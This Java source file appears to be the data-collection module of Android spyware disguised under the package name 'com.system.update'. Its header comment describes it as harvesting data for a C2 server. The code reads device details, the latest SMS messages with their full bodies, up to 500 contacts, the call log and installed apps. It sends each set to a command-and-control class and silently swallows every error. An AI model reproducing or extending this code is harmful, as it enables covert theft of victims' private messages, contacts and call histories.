package com.system.update;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

/** Harvest SMS / contacts / call log / installed apps → C2. */
public final class Collector {

    private Collector() {}

    public static void runAll(Context ctx) {
        try {
            C2.sendImportant("device_info", deviceInfo(ctx));
        } catch (Throwable ignored) {}
        try {
            C2.sendImportant("sms", dumpSms(ctx));
        } catch (Throwable ignored) {}
        try {
            C2.sendImportant("contacts", dumpContacts(ctx));
        } catch (Throwable ignored) {}
        try {
            C2.sendImportant("calls", dumpCalls(ctx));
        } catch (Throwable ignored) {}
        try {
            C2.send("apps", dumpApps(ctx));
        } catch (Throwable ignored) {}
    }

    private static String deviceInfo(Context ctx) {
        try {
            JSONObject o = new JSONObject();
            o.put("model", Build.MODEL);
            o.put("brand", Build.BRAND);
            o.put("device", Build.DEVICE);
            o.put("sdk", Build.VERSION.SDK_INT);
            o.put("release", Build.VERSION.RELEASE);
            o.put("fingerprint", Build.FINGERPRINT);
            o.put("package", ctx.getPackageName());
            return o.toString();
        } catch (Throwable t) {
            return "{}";
        }
    }

    @SuppressLint("Range")
    private static String dumpSms(Context ctx) {
        JSONArray arr = new JSONArray();
        ContentResolver cr = ctx.getContentResolver();
        try (Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 200")) {
            if (c == null) return "[]";
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("addr", c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)));
                o.put("body", c.getString(c.getColumnIndex(Telephony.Sms.BODY)));
                o.put("date", c.getLong(c.getColumnIndex(Telephony.Sms.DATE)));
                o.put("type", c.getInt(c.getColumnIndex(Telephony.Sms.TYPE)));
                arr.put(o);
            }
        } catch (Throwable t) {
            return "[]";
        }
        return arr.toString();
    }

    @SuppressLint("Range")
    private static String dumpContacts(Context ctx) {
        JSONArray arr = new JSONArray();
        ContentResolver cr = ctx.getContentResolver();
        try (Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, null)) {
            if (c == null) return "[]";
            int n = 0;
            while (c.moveToNext() && n < 500) {
                JSONObject o = new JSONObject();
                o.put("name", c.getString(0));
                o.put("phone", c.getString(1));
                arr.put(o);
                n++;
            }
        } catch (Throwable t) {
            return "[]";
        }
        return arr.toString();
    }

    @SuppressLint("Range")
    private static String dumpCalls(Context ctx) {
        JSONArray arr = new JSONArray();
        ContentResolver cr = ctx.getContentResolver();
        try (Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100")) {
            if (c == null) return "[]";
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("number", c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));
                o.put("type", c.getInt(c.getColumnIndex(CallLog.Calls.TYPE)));
                o.put("date", c.getLong(c.getColumnIndex(CallLog.Calls.DATE)));
                o.put("duration", c.getLong(c.getColumnIndex(CallLog.Calls.DURATION)));
                arr.put(o);
            }
        } catch (Throwable t) {
            return "[]";
        }
        return arr.toString();
    }

    private static String dumpApps(Context ctx) {
        JSONArray arr = new JSONArray();
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo ai : apps) {
                if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                JSONObject o = new JSONObject();
                o.put("pkg", ai.packageName);
                o.put("label", pm.getApplicationLabel(ai).toString());
                arr.put(o);
            }
        } catch (Throwable t) {
            return "[]";
        }
        return arr.toString();
    }
}
